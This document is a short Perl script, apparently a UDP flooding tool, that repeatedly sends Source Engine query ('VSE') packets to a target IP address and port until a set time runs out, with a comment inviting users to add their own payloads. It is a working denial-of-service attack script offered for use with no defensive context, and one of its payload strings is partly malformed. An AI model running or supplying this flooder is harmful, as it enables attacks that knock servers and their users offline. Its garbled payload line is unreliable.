use Socket;
use strict;
# sends vse payloads - you can make your own to add to the list of payloads to send
my ($ip,$port,$size,$time) = @ARGV;
  
my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip");
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
  send("flood", "\x54\x1111\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x1111/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", 0, pack_sockaddr_in($pport, $iaddr));
  send("flood", "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79", 0, pack_sockaddr_in($pport, $iaddr));
	};